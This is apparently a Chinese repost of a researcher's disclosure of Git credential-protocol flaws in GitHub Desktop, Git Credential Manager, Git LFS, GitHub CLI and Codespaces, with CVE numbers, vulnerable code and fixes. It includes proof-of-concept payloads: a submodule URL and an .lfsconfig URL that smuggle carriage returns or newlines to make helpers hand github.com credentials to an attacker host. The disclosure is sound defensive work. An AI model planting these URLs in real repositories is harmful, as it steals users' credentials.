#  多个 Git 漏洞导致凭证泄露   
 独眼情报   2025-01-28 02:29  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnR9jjb2OBGbwLz79NahnnvHPiaJaNQm83mrFXNhola5ZlVptqPl68OlWBzuQoe2GMK612aujqrJyFQ/640?wx_fmt=png&from=appmsg "")  
## 引言  
  
大家好，我是 RyotaK（@ryotkak），GMO Flatt Security 公司的安全工程师。  
  
2024年10月，我在参与GitHub漏洞赏金计划进行漏洞挖掘时，对GitHub Enterprise Server的调查感到有些乏味，于是决定转向GitHub Desktop寻找漏洞。  
  
在阅读GitHub Desktop的源代码后，我发现了一个允许恶意仓库窃取用户凭证的漏洞。由于这个漏洞的概念非常有趣，我决定进一步调查其他Git相关项目，结果发现了多个类似漏洞。  
  
本文将详细分享这些漏洞的技术细节。  
## 内容提要  
  
Git实现了一个名为Git凭证协议的机制，用于从凭证助手（credential helper）获取凭证。  
  
凭证助手是存储和提供Git凭证的程序，常见的有git-credential-store、git-credential-winstore和git-credential-osxkeychain等。  
  
由于对消息处理不当，多个项目存在不同类型的凭证泄漏风险。  
## Git凭证协议  
  
当从凭证助手获取凭证时，Git会发送如下格式的消息：  
```
protocol=https
host=github.com

```  
  
凭证助手则返回类似格式的响应：  
```
protocol=https
host=github.com
username=用户名
password=密码

```  
  
每条消息以换行符（\n）分隔，并在Git和凭证助手中进行解析。为了防止属性注入，Git明确禁止在属性名和值中使用换行符和NULL字节。  
## GitHub Desktop正则表达式缺陷导致回车符走私（CVE-2025-23040）  
  
GitHub Desktop具有自动向Git客户端提供凭证的功能，该功能通过名为trampoline的凭证助手实现。其处理凭证协议的关键代码如下：  
  
app/src/lib/trampoline/trampoline-credential-helper.ts(https://github.com/desktop/desktop/blob/9b253ea814341c2163a73e190641fa4657dc4fd7/app/src/lib/trampoline/trampoline-credential-helper.ts#L225-L250)  
```
  const input = parseCredential(command.stdin)
    [...]
    if (firstParameter === 'get') {
      const cred = await getCredential(input, store, token)
      if (!cred) {
        const endpoint = `${getCredentialUrl(input)}`
        info(`could not find credential for ${endpoint}`)
        setHasRejectedCredentialsForEndpoint(token, endpoint)
      }
      return cred ? formatCredential(cred) : undefined
    } else if (firstParameter === 'store') {
      await storeCredential(input, store, token)
    } else if (firstParameter === 'erase') {
      await eraseCredential(input, store, token)
    }
    return undefined

```  
  
当trampoline接收消息时，会使用parseCredential函数进行解析：  
  
app/src/lib/git/credential.ts 第3-28行(https://github.com/desktop/desktop/blob/6d57135bd0082627adc5ccafa8479110130da361/app/src/lib/git/credential.ts#L3-L28)  
```
export const parseCredential = (value: string) => {
  const cred = new Map<string, string>()

  // 凭证协议采用key=value格式，部分键是数组形式（key[]）
  // 需将多个key[]展开为key[0], key[1]...序列
  for (const [, k, v] of value.matchAll(/^(.*?)=(.*)$/gm)) {
    if (k.endsWith('[]')) {
      let i = 0
      let newKey

      do {
        newKey = `${k.slice(0, -2)}[${i}]`
        i++
      } while (cred.has(newKey))

      cred.set(newKey, v)
    } else {
      cred.set(k, v)
    }
  }

  return cred
}

```  
  
表面上看，这段代码通过正则表达式正确解析了消息。但ECMAScript规范中的正则表达式多行模式存在隐患：当启用m标志时，正则表达式会将回车符（\r）、行分隔符（\u2028）和段落分隔符（\u2029）都视为换行符，而Git凭证协议仅使用换行符（\n）分隔消息。  
  
这种差异允许恶意仓库通过构造如下URL的子模块来窃取凭证：  
```
http://%0dprotocol=https%0dhost=github.com%0d@localhost:13337/

```  
  
其中%0d是回车符的URL编码形式。Git会将以下消息发送给凭证助手：  
```
protocol=http
host=localhost
username=\rprotocol=https\rhost=github.com\r

```  
  
Git仍会识别localhost为主机，但GitHub Desktop会误将github.com识别为目标主机，从而将github.com的凭证返回给localhost，导致凭证泄漏。  
## Git Credential Manager的StreamReader使用不当导致回车符走私（CVE-2024-50338）  
  
Git Credential Manager是.NET开发的跨平台凭证助手，其问题源于StreamReader类的特性。在读取凭证协议消息时，使用以下代码：  
  
src/shared/Core/StandardStreams.cs 第36-47行(https://github.com/git-ecosystem/git-credential-manager/blob/3c28096588f549cb46f36b552390514356830abe/src/shared/Core/StandardStreams.cs#L36-L47)  
```
        public TextReader In
        {
            get
            {
                if (_stdIn == null)
                {
                    _stdIn = new StreamReader(Console.OpenStandardInput(), EncodingEx.UTF8NoBom);
                }

                return _stdIn;
            }
        }

```  
  
由于StreamReader.ReadLine方法将\n、\r和\r\n都视为换行符，攻击者可以通过类似GitHub Desktop案例的方式实施凭证走私攻击。  
## Git LFS换行注入导致凭证泄漏（CVE-2024-53263）  
  
虽然Git客户端本身具备换行符防护机制，但Git LFS（大文件存储扩展）在构造凭证协议消息时存在缺陷：  
  
creds/creds.go 第61-76行https://github.com/git-lfs/git-lfs/blob/a577e336ebdccfd312b6006c880f010b5d3fe796/creds/creds.go#L61-L76)  
```
func bufferCreds(c Creds) *bytes.Buffer {
    [...]
    buf.Write([]byte(k))
    buf.Write([]byte("="))
    buf.Write([]byte(item))
    buf.Write([]byte("\n"))
    [...]
}

```  
  
该函数未对换行符进行过滤。通过在仓库的.lfsconfig文件中设置如下恶意URL：  
```
[lfs]
        url = http://%0Ahost=github.com%0Aprotocol=https%0A@localhost:13337/

```  
  
Git LFS会向凭证助手发送包含换行符的消息，导致凭证助手返回github.com的凭证给攻击者控制的localhost:13337。  
## Git的纵深防御补丁（CVE-2024-52006）  
  
为缓解回车符走私问题，Git新增了credential.protectProtocol配置项（默认启用），拒绝包含回车符的URL：  
  
credential.c 第403-406行(https://github.com/git/git/blob/757161efcca150a9a96b312d9e780a071e601a03/credential.c#L403-L406)  
```
if (c->protect_protocol && strchr(value, '\r'))
    die("credential value for %s contains carriage return\n"
        "If this is intended, set `credential.protectProtocol=false`",
        key);

```  
  
Git LFS也应用了类似防护机制。  
## GitHub CLI的访问令牌泄漏漏洞（CVE-2024-53858）  
  
GitHub CLI的凭证助手存在逻辑缺陷：当CODESPACES=true环境变量存在时（如GitHub Codespaces环境），会将GITHUB_TOKEN发送给任意主机：  
  
pkg/auth/auth.go 第64-94行(https://github.com/cli/go-gh/blob/71770357e0cb12867d3e3e288854c0aa09d440b7/pkg/auth/auth.go#L64-L94)  
```
func tokenForHost(...) {
    if IsEnterprise(host) {
        if isCodespaces {
            return os.Getenv(githubToken)  // 在Codespaces中泄漏令牌
        }
    }
}

```  
## GitHub Codespaces凭证助手缺陷  
  
GitHub Codespaces内置的凭证助手脚本存在设计缺陷：  
  
/.codespaces/bin/gitcredential_github.sh  
```
echo password=$GITHUB_TOKEN  # 无条件返回令牌

```  
  
攻击者可通过任意域名获取GITHUB_TOKEN。后续修复方案增加了主机验证逻辑：  
```
if [ "$url" = "$GITHUB_SERVER_URL" ]; then
    echo password=$GITHUB_TOKEN  # 仅对合法域名返回
fi

```  
## 总结  
  
本文揭示了Git生态系统中多个项目的凭证协议实现缺陷，主要成因包括：  
1. 换行符处理差异（ECMAScript正则表达式与协议规范不一致）  
  
1. 第三方库的隐式换行处理（如.NET的StreamReader）  
  
1. 协议实现逻辑缺陷（无条件返回凭证）  
  
1. 环境变量滥用（Codespaces环境令牌泄漏）  
  
防御建议：  
- 严格遵循协议规范处理消息分隔  
  
- 实施输入验证（过滤\r和\n）  
  
- 按域名精确匹配凭证  
  
- 避免在通用凭证助手中硬编码敏感信息  
  
这些案例警示我们，文本协议实现中细微的解析差异可能引发严重的安全问题。Git社区已通过纵深防御措施加强生态安全性，建议开发者及时更新相关组件。  
- 文章原文：https://flatt.tech/research/posts/clone2leak-your-git-credentials-belong-to-us/  
  
  
  
  
